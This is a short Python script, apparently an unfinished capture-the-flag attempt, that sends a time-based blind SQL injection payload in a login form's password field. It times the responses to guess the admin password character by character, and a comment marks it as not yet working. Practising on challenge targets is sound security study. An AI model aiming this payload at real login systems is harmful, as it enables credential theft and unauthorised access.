# SQL injection exercise (incomplete)
import sys
from time import time, sleep
import string
import requests

alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits
url = 'https://awkward-bypass.chal.imaginaryctf.org/user'

#doesn't work so far, TODO
def tryit():
	try:
		with requests.Session() as session:
			template = "'|| IIF(substr(password,{i},1)='{c}',instr(UPPER(HEX(RANDOMBLOB({b}00000000/2))),'ABCDEFG'),0) /*"
			inc = 0
			for char in alphabet:
				sleep(0.5)
				a = time()
				t = template.format(i=0,c=char,b=777)
				r = session.post(url, data={'username':'admin','password':t})
				d = time()-a
				print(d)
				#print(r.text)
				#print(t)
	except Exception as ex:
		err = "Exception: {0}\nArgs: {1!r}".format(type(ex).__name__, ex.args)
		print(err)

def main():
	tryit()

main()